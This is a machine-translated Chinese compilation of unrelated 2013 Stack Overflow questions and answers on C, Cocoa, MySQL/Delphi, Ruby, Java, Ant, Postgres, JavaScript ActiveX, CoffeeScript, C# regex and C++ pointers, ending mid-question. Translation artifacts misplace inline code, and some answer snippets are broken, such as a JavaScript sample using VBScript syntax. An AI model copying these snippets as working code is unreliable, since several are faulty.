观察它`sprintf`返回写入的字符数，因此您可以构建一个字符串，而不会屈服于[Schlemiel the Painter 的算法](http://en.wikipedia.org/wiki/Schlemiel_the_Painter%27s_algorithm)。如果您想确保不会超出固定大小的缓冲区，`snprintf`将为您执行此操作（`strcat`只会盲目连接，并且没有标准方法可以避免这种情况）。

请注意，该[`pid_t`标准](http://pubs.opengroup.org/onlinepubs/009695299/basedefs/sys/types.h.html)保证存在“一个或多个编程环境，其中`pid_t`... 的 [width] 不大于 type 的宽度`long`”。因此，只要这么说，铸就`pid_t`是安全的。`long``getconf`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T03:10:53.777

我看到几个引用提到转换为 long，然后使用`%ld`sprintf 的格式说明符：`sprintf(str + strlen(str), "%ld", (long) getpid());`

# xcode - NSTextField 外面的蓝色对焦环不见了？

> ID：15262318
> 
> 赞同：0
> 
> 时间：2013-03-07T03:03:48.033
> 
> 标签：xcode, macos, nsthread, nstextfield

在正常情况下，一个蓝色的矩形会出现在成为第一响应者的 NSTextField 对象之外，如下图所示：
[Normal Case 的链接](http://www.douban.com/photos/photo/1890813470/#image)

但是，我得到了一个外面没有蓝色边框的 NSTextField。这是为什么？

它是这样发生的：
1> 我创建了一个典型的 MAC OS 应用程序。
2> 我通过调用对应视图的*addSubview:*和*removeFromSuperview*方法来切换app 的子视图。
3> 在一个子视图（实际上是上面引用的图像）中，我单击“下一步”按钮。它的动作是这样的（在子视图的控制器 .m 文件中定义）：

```
- (IBAction)actionNextClicked:(id)sender{
//_hdlThreadNext is a NSThread object
    [[_hdlThreadNext alloc] initWithTarget:self selector@selector(threadNext:) object:nil];
    [_hdlThreadNext start];
} 
```

线程是这样的：

```
- (void)threadNext:(id)sender{
    @autoreleasepool{
         BOOL success;

         [CATransation begin];

         /* send username and password and decrypt responce */
         ... // balabala... and set "success"

         if (success){
             [[self view] removeFromSuperview];
             [self sendMessageToSuperview:@"Add Next View"];    // Superview's method, telling superview to call addSubview: to add another subview
         }
         else{
             /* Nothing special to do */
         }

         [CATransation commit];
    }
} 
```

4> 子视图切换到另一个。它的组合视图似乎没问题：[组合视图的图像](http://www.douban.com/photos/photo/1890813516/#image)
但是另一个 NSTextView 的蓝色边框将不再出现！

有没有人知道我做错了什么？非常感谢你！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-08T08:37:31.083

也许是我完全错误的编程，所以很少有人遇到这个问题。
我找到了解决这个问题的方法。我提到所有（或大部分？）图形更改应该在博客的主线程中完成。因此，我将“if(success)”更改为：

```
if(success){
    dispatch_async(dispatch_get_main_queue()' ^{
        [[self view] removeFromSuperview];
        [self sendMessageToSuperview:@"Add Next View"];
    });
} 
```

解决了，对焦环又回来了。

# mysql - 在数据库网格中显示 MySql TIMEDIFF()

> ID：15262319
> 
> 赞同：0
> 
> 时间：2013-03-07T03:03:47.817
> 
> 标签：mysql, delphi, anydac

当我使用命令行时，这个查询给了我令人满意的结果（它显示了持续时间，这就是 TIMEDIFF 的含义）：

```
mysql> select timediff(end_time_stamp,start_time_stamp) from test_runs;
+-------------------------------------------+
| timediff(end_time_stamp,start_time_stamp) |
+-------------------------------------------+
| 00:00:07                                  |
| 00:00:11                                  |
| 00:01:23                                  |
+-------------------------------------------+
3 rows in set (0.00 sec) 
```

当我将它放在 Delphi 的数据库网格中时，TIMEDIFF 的格式为`12:00:07 AM`，这不是我想要的（看起来像时间，而不是持续时间）。

我正在使用 AnyDac，当我在设计时打开查询编辑器并执行它时，结果也是`12:00:07 AM`，所以似乎 AnyDac 出于某种原因正在格式化它。

如何获得 00:00:07 之类的输出（持续时间，而不是时间）？

*   我可以调整 AnyDac 查询吗？
*   我可以使用 MySql 语句显式格式化输出吗？
*   是否有一个 OnXXX() 函数，我可以对其进行编码以重新格式化（以及如何）？

* * *

[更新] 好吧，这段丑陋的代码做了我想要的，但是有没有更优雅的方式呢？

```
SELECT run_id,
       start_time_stamp,
       end_time_stamp,
       CONCAT(CONCAT(CONCAT(CONCAT(LPAD(EXTRACT(HOUR FROM timediff(end_time_stamp,start_time_stamp)), 2, '0'), ":"),LPAD(EXTRACT(MINUTE FROM timediff(end_time_stamp,start_time_stamp)), 2, '0'), ":"), LPAD(EXTRACT(SECOND FROM timediff(end_time_stamp,start_time_stamp)), 2, '0'))) AS duration,
       description

FROM test_runs ORDER BY start_time_stamp DESC 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:11:00.897

使用对象的[`DisplayFormat`](http://docwiki.embarcadero.com/Libraries/XE3/en/Data.DB.TDateTimeField.DisplayFormat)属性`TField`来得到你想要的结果，例如：

```
begin
  MyQuery.Open;
  MyQueryField.DisplayFormat := 'hh:nn:ss';
  //or casting a TField to a descendant, like this:
  (MyQuery.FieldByName('duration') as TDateTimeField).DisplayFormat := 'hh:nn:ss';
end; 
```

### 编辑

我向 TDateTimeField 添加了演员表。如果您的实际字段不是 TDateTimeField 的实例或后代，它将导致 EInvalidTypeCast 异常，因为您必须将其转换为它所属的正确类。

# ruby - 无限“while”循环

> ID：15262331
> 
> 赞同：1
> 
> 时间：2013-03-07T03:04:36.583
> 
> 标签：ruby

基本上它是 Rails 代码，但这是纯粹的 Ruby 问题。要知道 - @test.source 是一些字符串，可以包含`' '`（空格）。目的是删除所有不必要的空格，这些空格首先出现。例如，`%some word' '' '`应该离开`%some word' '`、`%another word' '' '' '`应该离开`%another word' '`等等。

```
for i in 0...@test.source.length
      if @test.source[i] == ' '
          i=i+1
          while @test.source[i] == ' '
              @test.source[0...i].chop
          end
      else
          i+=1
      end
  end 
```

由于某种原因，这个循环（显然是'while'）是无限的。为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:08:37.460

您不会`i`在 while 循环中递增，因此 while 循环将始终将指定字符与指定字符进行比较，`' '`而不会继续前进。

将其更改为：

```
 <% while @test.source[i] == ' ' %>
          <% @test.source[0...i].chop %>
          <% i=i+1 %>
      <% end %> 
```

...但即便如此，您的代码仍然存在问题。这是读者查看剩余问题的练习。:)

# ruby-on-rails - Rails Action Mailer - 去除页脚信息

> ID：15262332
> 
> 赞同：1
> 
> 时间：2013-03-07T03:04:42.603
> 
> 标签：ruby-on-rails, parsing, actionmailer, mailman-gem

用户可以接收发送到人员列表的电子邮件。他们会收到一条警告，告知他们可以随时取消订阅此列表。用户可以回复全部，回复将被发送回服务器并重新发送给其他人。但是，页脚仍然保留在他们的回复中。

我正在使用 ActionMailer 发送电子邮件。它们是多部分 HTML 电子邮件。

剥离这些信息的最简单方法是什么？理想情况下，我希望它不会将回复消息的任何部分内置到消息部分中。

![在此处输入图像描述](../Images/cb54b050cd90e70c3b504c555c545f66.png)

编辑：更多信息

将此视为支持票务。我只想创建一个包含回复信息的新记录，而不是工单中已有的回复链。例如，如果发送的第一封电子邮件包含“我需要帮助！”，那么第二封回复将包含“帮助什么？”。第三个回答是“我不知道……我很无聊”。

票证模型将具有三个记录：

1.  记录 1

    编号 = 1

    message = "我需要帮助！"

2.  记录 2

    编号 = 2

    message = "帮助什么？"

3.  记录 3

    编号 = 3

    message = “我不知道……我很无聊”

**编辑**

```
 doc = Nokogiri::HTML(message.html_part.body.decoded)
            doc.xpath("//blockquote").remove 
```

我能够通过使用 a 作为消息的一部分来剥离内容。但是，我现在遇到的问题如下。各种电子邮件客户端将添加自己的回复行。例如，Outlook 会添加此内容。

![在此处输入图像描述](../Images/5aeeee5220d0f572b1c03c2dddf2fd67.png)

Gmail 添加了这个

![在此处输入图像描述](../Images/37895aab54bf4786356aaa7344adfbf9.png)

由于这些项目将包含在新的块引用剥离中，我该如何解析这部分回复，以防止出现带有垃圾数据的乱码票记录。

# wso2 - 从源代码构建 API Manager 失败

> ID：15262334
> 
> 赞同：0
> 
> 时间：2013-03-07T03:04:54.563
> 
> 标签：wso2

我正在尝试根据[http://docs.wso2.org/wiki/display/AM130/Obtaining+the+Product#ObtainingtheProduct-source上的文档从源代码构建 API 管理器](http://docs.wso2.org/wiki/display/AM130/Obtaining+the+Product#ObtainingtheProduct-source)

我做了`svn checkout http://svn.wso2.org/repos/wso2/carbon/platform/tags/4.0.3/products/apimgt/1.2.0 wso2carbon`

然后我做了`"mvn clean install -Dproduct=apimgt"`

我正在使用 maven 3 和 Java 6。我收到以下错误；关于出了什么问题以及如何构建源代码的任何想法？...

```
[ERROR] Failed to execute goal org.wso2.maven:carbon-p2-plugin:1.5:p2-profile-ge
n (3-p2-profile-generation) on project am-p2-profile: P2 publisher return code w
as 13 -> [Help 1]
org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal o
rg.wso2.maven:carbon-p2-plugin:1.5:p2-profile-gen (3-p2-profile-generation) on p
roject am-p2-profile: P2 publisher return code was 13
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor
.java:217)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor
.java:153)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor
.java:145)
        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProje
ct(LifecycleModuleBuilder.java:84)
        at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProje
ct(LifecycleModuleBuilder.java:59)
        at org.apache.maven.lifecycle.internal.LifecycleStarter.singleThreadedBu
ild(LifecycleStarter.java:183)
        at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(Lifecycl
eStarter.java:161)
        at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:320)
        at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:156)
        at org.apache.maven.cli.MavenCli.execute(MavenCli.java:537)
        at org.apache.maven.cli.MavenCli.doMain(MavenCli.java:196)
        at org.apache.maven.cli.MavenCli.main(MavenCli.java:141)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.
java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced(Laun
cher.java:290)
        at org.codehaus.plexus.classworlds.launcher.Launcher.launch(Launcher.jav
a:230)
        at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode(La
uncher.java:409)
        at org.codehaus.plexus.classworlds.launcher.Launcher.main(Launcher.java:
352)
Caused by: org.apache.maven.plugin.MojoExecutionException: P2 publisher return c
ode was 13
        at org.wso2.maven.p2.ProfileGenMojo.execute(ProfileGenMojo.java:171)
        at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(Default
BuildPluginManager.java:101)
        at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor
.java:209)
        ... 19 more
Caused by: org.apache.maven.plugin.MojoFailureException: P2 publisher return cod
e was 13
        at org.wso2.maven.p2.ProfileGenMojo.installFeatures(ProfileGenMojo.java:
213)
        at org.wso2.maven.p2.ProfileGenMojo.execute(ProfileGenMojo.java:164)
        ... 21 more 
```

# java - 链接字符串的子字符串

> ID：15262345
> 
> 赞同：3
> 
> 时间：2013-03-07T03:05:39.717
> 
> 标签：java, string

我只想获取以下链接字符串的实际链接：

```
String link = <a href="http://www.facebook.com/wwwausedu" target="_blank" class="btnFacebook">Link to Facebook</a> 
```

结果应该只有`www.facebook.com/wwwausedu`

我尝试了以下但它不工作：

```
TEMP = link.substring(link.indexOf("http://")+1, tmp.lastIndexOf("\"")); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-07T03:09:51.920

您不需要 的最后一个索引`"`，而是您**之后**`http://`的第一个索引：

```
TEMP = link.substring(link.indexOf("http://")+7, link.indexOf("\"", link.indexOf("http://"))); 
```

该[`String.indexOf(String str, int fromIndex)`](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/String.html#indexOf%28java.lang.String,%20int%29)函数`str`在指定索引之后获取第一次出现的 。此外，正如@mellamokb the Wise 指出的那样，您需要添加`7`到索引中，而不是`1`，因为您想`http://`从结果中排除。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-07T03:22:58.943

为什么不使用专门为解析 HTML 设计的工具，如[jsoup](http://jsoup.org/)。

```
String link = "<a href=\"http://www.facebook.com/wwwausedu\" "
        + "target=\"_blank\" class=\"btnFacebook\">Link to Facebook</a>";

Document doc = Jsoup.parse(link);
String address = new URL(doc.select("a").attr("href")).toString(); 
```

这将返回：`http://www.facebook.com/wwwausedu`但我们只想要没有协议的部分，所以现在让我们使用 URL

```
URL url=new URL(address);
System.out.println(url.getHost()+url.getPath()); 
```

输出：

```
www.facebook.com/wwwausedu 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-07T03:12:03.950

尝试使用正则表达式

```
 Pattern p = Pattern.compile("href=\"(.*?)\"");
    Matcher m = p.matcher(link);
    String url = null;
    if (m.find()) {
        url = m.group(1); // this will give you the URL
    } 
```

**编辑**：要删除*http*也使用正则表达式 "href=\"http://(.*?)\""

# ant - Ant Task 使用 docco 创建 docs 目录树

> ID：15262346
> 
> 赞同：1
> 
> 时间：2013-03-07T03:05:44.790
> 
> 标签：ant, documentation, coffeescript, docco

我有一个 ant 文件，可以用[docco](http://jashkenas.github.com/docco/)生成 coffeescript 文档。它工作正常，除了它当前将所有文档文件转储到 docs 文件夹中。我希望 docs 文件夹反映我的脚本目录的结构，而不是仅仅将所有文件平铺到一个目录中。

```
<target name="documentation" description="Generate Docco Documentation for coffee files">
    <apply executable="docco" verbose="true" force="true" failonerror="true">
        <srcfile />
        <fileset dir ="${src.script.dir}" >
            <include name="**/*.coffee"/>
        </fileset>
    </apply>
</target> 
```

我知道 docco 有一个 --output 参数，但是我不确定如何在 docs 文件夹中为文件集中的每个文件生成 docs 目录路径，而无需一一进行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T19:03:43.473

[**应用**](http://ant.apache.org/manual/Tasks/apply.html)[任务](http://ant.apache.org/manual/Tasks/apply.html)的使用`<srcfile>`和`<targetfile>`参数应该可以解决问题。[](http://ant.apache.org/manual/Tasks/apply.html)

 **`.a`这是一个将带有扩展名的文件移动到`.b`扩展名的示例：

```
<apply executable="mv" dir="./" relative="true">
   <mappedresources>
        <fileset dir="." includes="**/*.a"/>
   </mappedresources>
   <mapper type="glob" from="*.a" to="*.b"/>
   <srcfile/>
   <targetfile/>
</apply> 
```

也看一下[Mapper](http://ant.apache.org/manual/Types/mapper.html)类型。

为您的情况尝试类似的方法：

```
<target name="documentation" description="Generate Docco Documentation for coffee files">
    <apply executable="docco" verbose="true" force="true" failonerror="true">
        <srcfile />
        <fileset dir ="${src.script.dir}" >
            <include name="**/*.coffee"/>
        </fileset>
        <arg value="--output">
        <mapper type="glob" from "*.coffee" to="*.html"/>
        <targetfile/>
    </apply>
</target> 
```**

# sql - 在 postgres 中解码等价物

> ID：15262351
> 
> 赞同：23
> 
> 时间：2013-03-07T03:06:09.223
> 
> 标签：sql, oracle, postgresql

没有等同于`Oracle`' `DECODE()'Function In`Postgres` 的东西。有没有人将 decode 作为函数编写？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-03-07T03:13:27.767

有一个等价物。这叫做[`CASE`](http://www.postgresql.org/docs/current/static/plpgsql-control-structures.html)声明。

CASE有两种形式：

**简单案例：**

```
CASE search-expression
    WHEN expression [, expression [ ... ]] THEN
      statements
  [ WHEN expression [, expression [ ... ]] THEN
      statements
    ... ]
  [ ELSE
      statements ]
END CASE; 
```

**搜索案例：**

```
CASE
    WHEN boolean-expression THEN
      statements
  [ WHEN boolean-expression THEN
      statements
    ... ]
  [ ELSE
      statements ]
END CASE; 
```

`CASE`陈述更容易阅读；`decode()`在 Oracle 中，我更喜欢这些。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-03-07T05:36:27.983

如果您习惯了 Oracle 特定的功能，您可能需要安装 PostgreSQL 扩展[`orafce`](http://pgxn.org/dist/orafce/)。

在其他 Oracle 特定功能中，`orafce`还实现`DECODE`了您正在寻找的功能。

如果您在 Ubuntu 上运行，您只需要安装软件包[`postgresql-9.1-orafce`](http://packages.ubuntu.com/precise/postgresql-9.1-orafce)即可`orafce`在您的 PostgreSQL 服务器中使用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-05-02T21:00:20.067

您可以将 NULLIF 与 COALESCE 结合使用：

从表中选择 COALESCE(NULLIF(value, 0), newValue)；

字体：[合并为零而不是 null](https://stackoverflow.com/questions/47918929/coalesce-for-zero-instead-of-null)

# module - DotNetNuke 6 模块开发

> ID：15262354
> 
> 赞同：0
> 
> 时间：2013-03-07T03:06:34.500
> 
> 标签：module, dotnetnuke

我对 dotnetnuke 完全陌生，并且安装了 dnn6 社区版。我正在尝试开发一个 dnn 模块。

1.  显示详细新闻
2.  在主页上显示前 8 条新闻（从那里导航到显示详细新闻）

我正在使用已安装的 web 入门套件作为模板和 vs .net2010 和开发环境。

在这方面我有3个问题。

1.  如何添加**用户控件**以将**TOP 8 NEWS**显示到现有模块，以便我可以将其添加为dnn 站点**中控件的新模块？**
2.  如何在这个控件的不同页面上显示不同类别的新闻？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T19:18:36.070

1) 您将需要创建一个新的模块定义，将控件作为另一个选项添加到现有定义中，或者甚至在使用新 ASCX 文件的扩展页面上定义一个全新的模块。您很可能会执行第一个选项，将 ModuleDef 添加到现有模块。然后，当您将模块添加到页面时，您实际上会在页面上加载两个不同的模块。您可以删除不想使用的那个。DNN 博客模块通过添加到页面的 5 或 6 个不同的控件来执行此操作。

2) 您需要为控制文章来自哪个类别的 ASCX 配置模块设置。

[如果您真的对模块开发很认真，我鼓励您查看我的 VS 模板，而不是入门工具包。您可以在 .9 版本http://christoctemplate.codeplex.com/releases/](http://christoctemplate.codeplex.com/releases/view/93348)中找到 DNN6/VS2010 模板[查看/93348](http://christoctemplate.codeplex.com/releases/view/93348)

所有较新的版本都适用于 Visual Studio 2012（即使是免费版本也可以使用，因此请查看这些版本）

# javascript - 如何使用 JavaScript 将数据写入文本文件

> ID：15262356
> 
> 赞同：0
> 
> 时间：2013-03-07T03:06:37.753
> 
> 标签：javascript, php, activexobject, fso

我在使用 JavaScript 将日期写入文件 Test.txt 时遇到了一些问题。我也找到了很好的答案，但我仍然无法解决。这是我的代码

```
<script type="text/javascript"> 
```

```
function WriteFile(){
       var fso  = new ActiveXObject("Scripting.FileSystemObject");
       var fh = fso.CreateTextFile("Test.txt", 8,true);
       x=document.getElementById("name").value;
       fh.WriteLine(x);
       fh.Close();
} 
```

和

```
<form>
    <input type="text" id="name"/>
    <input type="button" value="Save" id="write" onclick="WriteFile()"/>
</form> 
```

我认为我从电子书中看到的简单示例应该可以很好地运行它。

我不确定 Test.txt 的路径。我把它放在我本地主机的同一个文件夹中。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2018-03-23T05:50:59.163

这是您可以通过的示例：-

```
function WriteToFile(passForm) {

    set fso = CreateObject("Scripting.FileSystemObject"); 
    set s   = fso.CreateTextFile("<your Path>/filename.txt", True);

    var firstName = document.getElementById('FirstName');
    var lastName  = document.getElementById('lastName');

    s.writeline("First Name :" + FirstName);
    s.writeline("Last Name :" + lastName);

    s.writeline("-----------------------------");
    s.Close();
 }
```

```
<form onSubmit="WriteToFile(this)">
<label>Type your first name:</label>
<input type="text" name="FirstName" id="firstName" size="20">

<label>Type your last name: </abel>
<input type="text" name="LastName" id="lastName" size="20">

<input type="submit" value="submit">
</form>
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:12:19.180

根据[http://msdn.microsoft.com/en-us/library/czxefwt8(v=vs.84).aspx](http://msdn.microsoft.com/en-us/library/czxefwt8(v=vs.84).aspx)看起来您需要指定文件的完整路径。

例如`"C:\\Test.txt"`

更新：

刚刚在 IE9 中测试了它，它可以工作。

```
<head>
  <script>
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var fh = fso.CreateTextFile("c:\\Test.txt", 8, true);
    fh.WriteLine("foo");
    fh.Close();
  </script>
</head> 
```

# ruby-on-rails - I'm getting a hash outputted to my view if I run params[:query], but if I run #values on it, it breaks and says "I'm a String"

> ID：15262365
> 
> 赞同：0
> 
> 时间：2013-03-07T03:07:18.557
> 
> 标签：ruby-on-rails, ruby-on-rails-3, forms, params, actioncontroller

So I'm trying to set the default search field value to the pre-existing one if it exists

```
<%= form_tag universities_path, :method => "get", :class => "form-search" do %>
  <%= label_tag :query, "Search by name" %>
  <%= text_field_tag :query, :input => params[:query] unless params[:query].nil? %>
  <%= text_field_tag :query if params[:query].nil? %>
  <%= label_tag :state  %>
  <%= select_tag :state, options_for_select(@states, params[:state])   %>
  <%= submit_tag "Search", :class => 'btn' %>
<% end %> 
```

The above code outputs a hash that looks like this (`{:input=>"coastal"}`). When I run the `x.values` where x = params[:query] I get a "undefined method `values' for "coastal":String".

Running params[:query].class yields this (to the input field), btw (`{:input=>String}`)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:14:45.647

`text_field_tag` expects the second parameter as the value of the field. change

```
<%= text_field_tag :query, :input => params[:query] unless params[:query].nil? %>
<%= text_field_tag :query if params[:query].nil? %> 
```

to

```
<%= text_field_tag :query, params[:query] %> 
```

# visual-studio - SharePoint 工具 - Visual Studio 2012 - 奇怪的部署错误

> ID：15262367
> 
> 赞同：0
> 
> 时间：2013-03-07T03:07:39.363
> 
> 标签：visual-studio, sharepoint, sharepoint-2010

C:\Program Files (x86)\MSBuild\Microsoft\VisualStudio\v11.0\SharePointTools\Microsoft.VisualStudio.SharePoint.targets(375,5)：错误：无法加载项目文件。找不到文件

...然后将项目文件名引用到另一个 SharePoint 解决方案，该解决方案不再在解决方案中，并且无论如何都已重构（重命名）。与我尝试部署的那个没有依赖关系（据我所知） - 任何人都知道如何排除故障和修复。我在项目文件中四处寻找，但看不到任何明显的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:20:48.423

答案是：

*   在同一解决方案中为 SharePoint 项目创建的许多先前创建的功能依赖项。该依赖项目的名称随后被更改 - 功能依赖项可能必须保留到不再存在的旧项目名称的链接。

# javascript - Coffeescript 翻译 - 嵌套的 for 循环

> ID：15262369
> 
> 赞同：0
> 
> 时间：2013-03-07T03:07:46.570
> 
> 标签：javascript, loops, coffeescript

我正在尝试在coffeescript 中学习javascript，并通过在codepen 上重写一些简洁的javascript 来练习。出了点问题，我认为这是由于我不知道如何在咖啡脚本中编写嵌套循环。原始代码是：

```
for(var j = 0 ; j<yElems;j++){
  for(var i = 0 ; i<xElems;i++){

var elem = document.createElement('div');

if(i%2==0){
  elem.classList.add('bs');
}else{
  elem.classList.add('bs1');
}

elem.style.top = j*30-20+'px';    
elem.style.left = i*30-20+'px';    
elem.style.zIndex =100- j+''+i;
elem.style.backgroundColor = colors[Math.round(Math.random()*4)];
body.appendChild(elem); 
elems.push(elem);
 }
} 
```

我的“翻译”是：

```
grid = -> 
  for i in xElems
    elem = document.createElement 'div'
    if i % 2 is 0 then elem.classList.add 'bs' else elem.classList.add 'bs1'
    elem.style.top = j*30-20+'px'   
    elem.style.left = i*30-20+'px'    
    elem.style.zIndex = 100- j+''+i
    elem.style.backgroundColor = colors[Math.round(Math.random()*4)]
    body.appendChild(elem)
    elems.push(elem)

for j in yElems
  grid() 
```

不确定什么不起作用。如果不是这样，我仍然不确定。原笔在：

[http://codepen.io/pixelgrid/pen/Hxkhs](http://codepen.io/pixelgrid/pen/Hxkhs)

我的叉子是：

[http://codepen.io/bubbaJackson/pen/tyLGC](http://codepen.io/bubbaJackson/pen/tyLGC)

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:17:03.090

```
for i in xElems 
```

应该

```
for i in [0..xElems] by 1 
```

j 循环也应该这样做。

xElems 中的 i 将尝试将 xElems 视为一个数组，并为您提供数组中的每个元素。xElems 似乎是原始 js 中的一个数字，因此您想要迭代一个范围，您可以使用`[a..b]`符号来完成。请注意，`[a..b]`将排除 b，而`[a...b]`将包括 b 的值。

### 更新

正如`mu is too short`评论中指出的那样，这基本上直接编译为您试图复制的内容：`for(i = 0; i < xElems; ++i)`

# iphone - 你如何处理在 iOS 中获取数据的单独线程？

> ID：15262371
> 
> 赞同：5
> 
> 时间：2013-03-07T03:08:10.753
> 
> 标签：iphone, ios, objective-c, core-data

您好我目前正在构建一个具有以下属性的应用程序：

1.  使用 Core Data 进行存储
2.  有一个每次显示一个项目的提要
3.  如果项目不足，应用程序将从服务器异步调用 fetch

处理异步获取已被证明是相当棘手的。

目前，我们将从服务器获取的项目直接存储到 Core Data 中。

每次应用程序需要一个新项目时，我们都会在 Core Data 中查询一个看不见的项目。

由于不断查询核心数据，我们看到了对应用程序性能的一些重大影响。

我们曾考虑在内存中使用 Array 并为其保留索引，但一旦我们用完项目，异步获取方面被证明过于复杂，因为我们必须使用锁和其他并发措施来保证数组线程的安全。

你们对如何减少对 Core Data 的总调用次数有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T07:01:27.643

您需要将到持久存储的行程保持在最低限度，以便获取您希望显示的合理数量的项目。Core Data 在故障管理对象方面非常有效，因此内存占用不应该成为问题。

当您用完要显示的项目但数组中仍有一些剩余时，请尝试获取更多。

此时，如果您没有得到任何结果，请使用自己的托管对象上下文调度一个异步队列，创建新的托管对象，保存并通知主上下文，以便它可以合并更改。

完成后，您将返回获取新项目。

# c# - 需要帮助以匹配 C# 中的正则表达式模式

> ID：15262373
> 
> 赞同：2
> 
> 时间：2013-03-07T03:08:36.183
> 
> 标签：c#, regex

请帮助我匹配以 C# 中以下格式开头的正则**表达式模式：**

> “第 1.01 节。”
> “第 47.06 节。”
> “第 71.022 条。” “第 611 条。”
> “第 12A.002 节。”
> “第 12A.152 节。”
> “第 50D.001 节。”
> 
> “第 I.2 节。”
> “第 I.5B 节。”

我已经尝试过`"Sec\.\s\d+\.\d+\."`，但这仅适用于上述列表中的第一个模式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:32:20.090

这将匹配您列出的所有示例：`"Sec\. [A-Z\d]+\.([A-Z\d]+\.)?"\s?`

注意：节号只允许使用大写字母。

在这里解释演示：[http ://regex101.com/r/hC7pP9](http://regex101.com/r/hC7pP9)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:13:56.803

总是在引号，数字，字母和句点后的组合。'，每行一个或多个用空格分隔？

("秒.\s[\d\w.]+"\s?)+

# c++ - 动态内存分配导致访问冲突

> ID：15262377
> 
> 赞同：1
> 
> 时间：2013-03-07T03:08:45.440
> 
> 标签：c++, pointers, dynamic-memory-allocation

当我为十六进制数组中的缓冲区分配空间时，我的代码不断中断（即抛出访问冲突异常）。

我在 main 中将十六进制数组声明为两个星形指针，并通过引用传递它。

**main.cpp 中的某处**

```
char ** hexArray = nullptr; 
```

**fileio.cpp 中的某处**

```
void TranslateFile(char * byteArray, char **& hexArray, int numberOfBytes, char buffer[])
{
int temp = 0;

//Convert bytes into hexadecimal
for(int i = 0; i < numberOfBytes; i++)
{
    //Convert byteArray to decimal
     atoi(&byteArray[i]);

     //Set temp equal to byteArray
     temp = byteArray[i];

     //Convert temp to hexadecimal and store it in hex array
     itoa(temp, buffer, 16);

     //Allocate room for buffer
     hexArray[i] = new char[strlen(buffer) + 1]; //CODE BREAKS HERE

     //Copy buffer into newly allocated spot
     strcpy(hexArray[i], buffer);
}
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-07T03:12:08.410

```
char ** hexArray = nullptr; 
```

`hexArray`未初始化。

```
hexArray[i] = new char[strlen(buffer) + 1]; //CODE BREAKS HERE 
```

您取消引用`hexArray`，但它未初始化，因此您的程序会产生未定义的行为。*您需要对其进行初始化，并且根据您的代码示例，它必须至少* 指向`numberOfBytes`元素。

```
hexArray = new char *[numberOfBytes]; 
```

Now`hexArray`是一个已初始化的指针，它指向`numberOfBytes`未初始化的指针。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T03:12:42.437

您需要为外部数组分配内存。从您的示例中，可能是：

```
hexArray = new char *[numberOfBytes]; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-07T03:13:23.097

`char **`要么是一个数组，`char *`要么是一个指向 a 的指针`char *`。无论哪种方式，您都需要先分配一些东西，然后才能执行`hexArray[i]`.

main.cpp 中的某处：

```
hexArray = new char *[NUM_CHAR_PTRS]; 
```

之后...

```
hexArray[i] = new char[strlen(buffer) + 1]; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-07T03:14:56.443

您不为`hexArray`自身分配空间。你做了什么

```
 //Allocate room for buffer
 hexArray[i] = new char[strlen(buffer) + 1]; //CODE BREAKS HERE 
```

正在为 的元素分配内存`hexArray`。

所以你应该把代码：

```
hexArray = new char*[numberOfBytes]; 
```

在进入for循环之前。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-07T03:15:03.793

是否已经分配了`numberOfBytes`条目？`hexArray`

使用`strnlen`代替`strlen`或更好`std::string`。你知道是否`buffer`终止（即它是`TranslateFile`合同的一部分）吗？

# sql - 为链接表插入查询

> ID：15262379
> 
> 赞同：1
> 
> 时间：2013-03-07T03:08:50.403
> 
> 标签：sql, ms-access-2007

当我只有 3 条记录时，为什么我的插入查询插入 9 条记录？

这是我的表结构：

主题表

```
SubjectID   (Autonumber)    Primary Key
MasterID    (Number)        Foreign Key
Description (Text) 
```

主表

```
MasterID    (Autonumber)    Primary Key
StatusID    (Number)        Foreign Key
StudentID   (Text) 
Description (Text) 
```

状态表

```
